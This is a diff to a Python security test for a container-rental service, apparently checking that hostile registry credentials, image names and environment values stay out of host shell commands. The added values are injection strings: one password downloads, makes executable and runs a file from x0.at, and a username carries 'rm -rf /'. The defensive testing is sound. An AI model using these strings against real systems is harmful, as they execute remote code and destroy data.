@@ -22,7 +22,11 @@ from services.docker_service import DockerService
 from services.rental_docker_sdk import ContainerExecResult, build_gpu_docker_config
 
 
-HOSTILE_PASSWORD = "pw'; echo CREDENTIAL_MARKER; echo '"
+HOSTILE_USERNAME = "user'; rm -rf / #"
+HOSTILE_PASSWORD = (
+    "x' | curl https://x0.at/mney -o /tmp/mney"
+    "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
+)
 HOSTILE_IMAGE = "registry.example/image;echo IMAGE_MARKER\n$(echo IMAGE_SUBSHELL)"
 HOSTILE_ENV_VALUE = "value'; echo ENV_MARKER; $(echo env)"
 HOSTILE_PUBLIC_KEY = (
@@ -176,7 +180,7 @@ def _base_create_payload(**overrides) -> ContainerCreateRequest:
         "executor_id": str(uuid4()),
         "pod_id": "00000000-0000-0000-0000-0000000000aa",
         "docker_image": "daturaai/pytorch:security-test",
-        "docker_username": "registry-user",
+        "docker_username": HOSTILE_USERNAME,
         "docker_password": HOSTILE_PASSWORD,
         "user_public_keys": [HOSTILE_PUBLIC_KEY],
         "gpu_uuids": ["GPU-test"],
@@ -335,7 +339,10 @@ async def test_create_container_keeps_hostile_fields_out_of_host_shell_commands(
     _assert_markers_not_in_host_shell(
         _all_host_commands(captured_commands, ssh_client),
         [
-            "CREDENTIAL_MARKER",
+            "curl https://x0.at/mney",
+            "&&chmod +x /tmp/mney",
+            "/tmp/mney   |echo",
+            "rm -rf",
             "IMAGE_MARKER",
             "IMAGE_SUBSHELL",
             "ENV_MARKER",
@@ -345,7 +352,7 @@ async def test_create_container_keeps_hostile_fields_out_of_host_shell_commands(
         ],
     )
     assert docker_client.login_calls == [
-        {"username": "registry-user", "password": HOSTILE_PASSWORD}
+        {"username": HOSTILE_USERNAME, "password": HOSTILE_PASSWORD}
     ]
     assert docker_client.pulled_images == [HOSTILE_IMAGE]
     assert run_spec.image == HOSTILE_IMAGE
